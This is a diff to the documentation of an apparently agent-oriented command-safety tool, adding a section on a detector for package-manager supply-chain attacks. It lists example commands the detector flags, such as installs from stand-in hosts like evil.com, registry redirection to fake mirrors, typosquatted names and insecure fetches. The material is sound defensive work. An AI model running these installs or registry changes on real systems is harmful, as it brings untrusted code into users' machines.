@@ -8,6 +8,7 @@
 - [Destructive Commands Detector](#destructive-commands-detector)
 - [Git Force Operations Detector](#git-force-operations-detector)
 - [Environment Variable Leak Detector](#environment-variable-leak-detector)
+- [Package Manager Poisoning Detector](#package-manager-poisoning-detector)
 - [Code Injection Detector](#code-injection-detector)
 - [Binary Download & Execute Detector](#binary-download--execute-detector)
 - [Network Exfiltration Detector](#network-exfiltration-detector)
@@ -2199,6 +2200,346 @@ export function detectSecurityToolDisabling(toolUseData: ToolUseData): Promise<D
 
 ---
 
+## Package Manager Poisoning Detector
+
+**File:** `src/detectors/package-poisoning.ts`
+
+Detects supply chain attacks via malicious packages, typosquatting, and untrusted package sources. Protects against installation of compromised or malicious dependencies from npm, pip, cargo, gem, and other package managers.
+
+### What It Detects
+
+#### 1. Typosquatting
+
+Detects common package name misspellings that could be malicious packages impersonating legitimate ones.
+
+**Technique:** Uses Levenshtein distance (edit distance ≤ 2) to detect typos in popular package names.
+
+**Package Databases:**
+
+- **npm/yarn/pnpm:** 100+ popular packages (react, express, lodash, axios, typescript, etc.)
+- **pip:** 100+ popular packages (requests, numpy, pandas, django, flask, etc.)
+- **cargo:** 30+ popular packages (serde, tokio, clap, anyhow, etc.)
+- **gem:** 30+ popular packages (rails, rspec, devise, sidekiq, etc.)
+
+**Examples:**
+
+```bash
+# ✗ Typosquatting detected
+npm install reactt        # Similar to "react"
+npm install expresss      # Similar to "express"
+pip install requsts       # Similar to "requests"
+pip install numpyy        # Similar to "numpy"
+cargo install tokioo      # Similar to "tokio"
+gem install rail          # Similar to "rails"
+
+# ✓ Legitimate packages allowed
+npm install react
+pip install requests
+cargo install serde
+```
+
+#### 2. Untrusted Sources
+
+Detects package installation from non-standard or untrusted sources.
+
+**Patterns:**
+
+- HTTP sources (not HTTPS): `npm install http://evil.com/package.tgz`
+- Unknown git repositories: `npm install git+http://untrusted.com/repo.git`
+- Git+SSH from unknown hosts: `npm install git+ssh://git@unknown.com/repo.git`
+- File protocol: `npm install file:///tmp/package`
+- Direct URLs: `pip install http://malicious.com/wheel.whl`
+
+**Examples:**
+
+```bash
+# ✗ Untrusted sources
+npm install http://malicious-site.com/package.tgz
+npm install git+http://evil.com/repo.git
+pip install http://pypi-mirror.bad.com/package.tar.gz
+yarn add git+ssh://git@unknown-server.com/repo.git
+
+# ✓ Trusted sources (though still flagged for safety)
+npm install https://registry.npmjs.org/react/-/react-18.0.0.tgz
+pip install git+https://github.com/user/repo.git
+```
+
+#### 3. Registry Manipulation
+
+Detects attempts to change package registry to untrusted mirrors.
+
+**Patterns:**
+
+- `npm config set registry http://malicious-registry.com`
+- `yarn config set registry http://evil-mirror.com`
+- `pip config set global.index-url http://pypi.bad.com`
+- `cargo config set registry.crates-io.registry http://rust.bad.com`
+
+**Examples:**
+
+```bash
+# ✗ Registry manipulation
+npm config set registry http://npm-mirror.evil.com
+yarn config set registry https://untrusted-yarn.com
+pip config set global.index-url http://fake-pypi.com
+
+# ✓ Official registries (default behavior)
+# npm uses https://registry.npmjs.org by default
+# pip uses https://pypi.org by default
+```
+
+#### 4. Root/Sudo Installs
+
+Detects unnecessary privilege escalation during package installation.
+
+**High severity:** `sudo npm install -g` (global with sudo - dangerous)
+**Medium severity:** `sudo pip install package` (local with sudo - unnecessary)
+
+**Examples:**
+
+```bash
+# ✗ HIGH: Global install with sudo
+sudo npm install -g suspicious-cli
+sudo yarn global add untrusted-tool
+
+# ✗ MEDIUM: Local install with unnecessary sudo
+sudo pip install mypackage
+sudo gem install sometool
+
+# ✓ Safe: User-level installs
+npm install lodash
+pip install --user requests
+npm install -g npm  # User with nvm/node version manager
+```
+
+#### 5. Ignore Verification
+
+Detects package installation with security checks disabled.
+
+**Patterns:**
+
+- `npm install --ignore-scripts` - Skips lifecycle scripts (postinstall, etc.)
+- `pip install --no-verify` - Skips package verification
+- `pip install --trusted-host untrusted.com` - Bypasses SSL verification
+
+**Examples:**
+
+```bash
+# ✗ Verification disabled
+npm install suspicious-package --ignore-scripts
+pip install untrusted --no-verify
+pip install mypackage --trusted-host sketchy-mirror.com
+
+# ✓ Normal installs (verification enabled)
+npm install package
+pip install package
+```
+
+#### 6. Unusual Protocols
+
+Detects installation using uncommon or insecure protocols.
+
+**Patterns:**
+
+- `git+ssh://` from unknown hosts
+- `file://` protocol
+- `go get -insecure` (skips TLS verification)
+
+**Examples:**
+
+```bash
+# ✗ Unusual/insecure protocols
+npm install git+ssh://git@unknown-server.com/repo.git
+npm install file:///tmp/suspicious-package
+go get -insecure example.com/package
+
+# ✓ Standard protocols
+npm install git+https://github.com/user/repo.git
+go get github.com/user/package
+```
+
+#### 7. Installing from Temp Locations
+
+Detects package installation from temporary directories (suspicious).
+
+**Patterns:**
+
+- `/tmp/package`
+- `/temp/package`
+- `\temp\package` (Windows)
+
+**Examples:**
+
+```bash
+# ✗ Installing from temp
+npm install /tmp/suspicious-package
+pip install /temp/malicious-wheel.whl
+cargo install --path /tmp/rust-package
+
+# ✓ Installing from project directories
+npm install ./packages/my-local-package
+cargo install --path ./my-crate
+```
+
+### Severity Levels
+
+- **High:** Typosquatting, untrusted sources, registry manipulation, global sudo installs, insecure protocols, temp locations
+- **Medium:** Root installs (local), verification disabled
+
+### Examples
+
+#### Dangerous (Trigger Detection)
+
+```bash
+# Typosquatting
+npm install reactt expresss lodsh
+pip install requsts numpyy pandass
+cargo install serd tokioo
+
+# Untrusted sources
+npm install http://evil.com/package.tgz
+npm install git+http://untrusted.com/repo.git
+pip install http://malicious-pypi.com/package.tar.gz
+
+# Registry manipulation
+npm config set registry http://malicious-mirror.com
+pip config set global.index-url http://fake-pypi.com
+
+# Root installs
+sudo npm install -g suspicious-cli
+sudo pip install untrusted-package
+
+# Verification disabled
+npm install package --ignore-scripts
+pip install package --no-verify --trusted-host bad-host.com
+
+# Unusual protocols
+npm install git+ssh://git@unknown.com/repo.git
+npm install file:///tmp/package
+go get -insecure sketchy-site.com/package
+
+# Temp locations
+npm install /tmp/suspicious-package
+pip install /temp/malicious.whl
+```
+
+#### Safe (No Detection)
+
+```bash
+# Legitimate packages
+npm install react express lodash axios
+pip install requests numpy pandas django
+cargo install serde tokio clap
+gem install rails rspec
+
+# Scoped packages (organization-verified)
+npm install @angular/core
+npm install @types/node
+
+# User-level installs
+npm install package
+pip install --user package
+
+# Standard workflows
+npm install
+yarn install
+pip install -r requirements.txt
+cargo build
+
+# Local development
+npm install ./packages/my-package
+cargo install --path ./my-crate
+```
+
+### False Positive Prevention
+
+1. **Exact matches excluded:** Legitimate package names are never flagged
+2. **Scoped packages allowed:** `@scope/package` format indicates official/organization packages
+3. **Short names ignored:** Packages < 3 characters are skipped to avoid false positives
+4. **Length similarity check:** Only flags if package name lengths are within 2 characters
+5. **Package manager isolation:** npm packages only checked against npm list, pip against pip list, etc.
+
+### Supported Package Managers
+
+- **npm** - Node.js packages
+- **yarn** - Alternative Node.js package manager
+- **pnpm** - Fast, disk space efficient Node.js package manager
+- **pip/pip3** - Python packages
+- **cargo** - Rust packages
+- **gem** - Ruby packages
+- **go get/install** - Go packages
+
+### How to Customize
+
+#### Add More Popular Packages
+
+Edit the legitimate package lists in `src/detectors/package-poisoning.ts`:
+
+```typescript
+const LEGITIMATE_NPM_PACKAGES = [
+  // ... existing packages ...
+  'your-popular-package',
+  'another-common-package',
+];
+
+const LEGITIMATE_PIP_PACKAGES = [
+  // ... existing packages ...
+  'your-python-package',
+];
+```
+
+#### Adjust Typosquatting Sensitivity
+
+Change the maximum Levenshtein distance:
+
+```typescript
+// Current: distance ≤ 2
+const legitimatePackage = findTyposquat(pkg, LEGITIMATE_NPM_PACKAGES, 2);
+
+// More strict (fewer false positives, might miss typos)
+const legitimatePackage = findTyposquat(pkg, LEGITIMATE_NPM_PACKAGES, 1);
+
+// Less strict (catches more typos, more false positives)
+const legitimatePackage = findTyposquat(pkg, LEGITIMATE_NPM_PACKAGES, 3);
+```
+
+#### Whitelist Specific Sources
+
+Add exceptions for trusted internal registries:
+
+```typescript
+// In detectPackagePoisoning function, add before untrusted source check:
+if (/npm install.*internal-registry\.company\.com/.test(toolInput)) {
+  return Promise.resolve(null); // Allow internal registry
+}
+```
+
+#### Allow Specific sudo Installs
+
+Add exceptions for legitimate global tool installations:
+
+```typescript
+// Before root install check:
+const allowedGlobalTools = ['npm', 'yarn', 'typescript', 'eslint'];
+if (/sudo npm install -g/.test(toolInput)) {
+  const pkgs = extractPackageNames(command, 'npm');
+  if (pkgs.every((pkg) => allowedGlobalTools.includes(pkg))) {
+    return Promise.resolve(null); // Allow these specific global installs
+  }
+}
+```
+
+### Configuration
+
+Currently, the detector is always enabled with hardcoded severity levels. Future versions may support:
+
+- Configurable package lists
+- Custom typosquatting thresholds
+- Whitelist for trusted sources
+- Severity customization per pattern type
+
+---
+
 ## Magic String Detector
 
 **File:** `src/detectors/magic-string.ts`
@@ -2365,19 +2706,19 @@ npm test
 
 ## Summary
 
-| Detector                       | What It Catches                                        | Severity     | Key Features                                                  |
-| ------------------------------ | ------------------------------------------------------ | ------------ | ------------------------------------------------------------- |
-| **Credential Leak**            | API keys, tokens, secrets hardcoded in commands        | High         | 15+ service patterns, entropy analysis, placeholder detection |
-| **Credential Harvesting**      | Stealing stored credentials from filesystem            | High         | 10 categories (SSH, AWS, browsers, K8s, etc.), safe operation whitelist |
-| **Destructive Commands**       | rm -rf, disk operations, fork bombs, system damage     | High         | Safe path whitelist, context-aware                            |
-| **Git Force Operations**       | Force push, hard reset, history rewriting              | High/Medium  | Allows --force-with-lease, protected branches                 |
-| **Env Var Leak**               | Secrets in environment variables exposed to output     | High/Medium  | Context-aware (safe vs dangerous usage), indirect dumps       |
-| **Binary Download & Execute**  | Download + execute without verification, pipe to shell | High         | Whitelisted trusted installers, domain trust list             |
-| **Network Exfiltration**       | Data theft via network, reverse shells, DNS leaks      | High         | Multi-layer detection, safe operation whitelist               |
-| **Security Tool Disabling**    | Disabling firewalls, AV, SELinux, logging, updates     | High         | 8 categories, safe status checks allowed                      |
-| **Backdoor/Persistence**       | Cron, systemd, SSH keys, profiles, SUID, LD_PRELOAD    | **Critical** | 10 persistence mechanisms, real-world attack patterns         |
-| **Container Escape**           | Privileged containers, socket mounts, namespace escape | **High**     | 12 escape techniques, Docker/K8s/Podman, CI/CD exceptions     |
-| **Magic String**               | Test detector (development only)                       | N/A          | Example for contributors                                      |
+| Detector                      | What It Catches                                        | Severity     | Key Features                                                            |
+| ----------------------------- | ------------------------------------------------------ | ------------ | ----------------------------------------------------------------------- |
+| **Credential Leak**           | API keys, tokens, secrets hardcoded in commands        | High         | 15+ service patterns, entropy analysis, placeholder detection           |
+| **Credential Harvesting**     | Stealing stored credentials from filesystem            | High         | 10 categories (SSH, AWS, browsers, K8s, etc.), safe operation whitelist |
+| **Destructive Commands**      | rm -rf, disk operations, fork bombs, system damage     | High         | Safe path whitelist, context-aware                                      |
+| **Git Force Operations**      | Force push, hard reset, history rewriting              | High/Medium  | Allows --force-with-lease, protected branches                           |
+| **Env Var Leak**              | Secrets in environment variables exposed to output     | High/Medium  | Context-aware (safe vs dangerous usage), indirect dumps                 |
+| **Binary Download & Execute** | Download + execute without verification, pipe to shell | High         | Whitelisted trusted installers, domain trust list                       |
+| **Network Exfiltration**      | Data theft via network, reverse shells, DNS leaks      | High         | Multi-layer detection, safe operation whitelist                         |
+| **Security Tool Disabling**   | Disabling firewalls, AV, SELinux, logging, updates     | High         | 8 categories, safe status checks allowed                                |
+| **Backdoor/Persistence**      | Cron, systemd, SSH keys, profiles, SUID, LD_PRELOAD    | **Critical** | 10 persistence mechanisms, real-world attack patterns                   |
+| **Container Escape**          | Privileged containers, socket mounts, namespace escape | **High**     | 12 escape techniques, Docker/K8s/Podman, CI/CD exceptions               |
+| **Magic String**              | Test detector (development only)                       | N/A          | Example for contributors                                                |
 
 Each detector is designed to catch real security issues while minimizing false positives through:
 
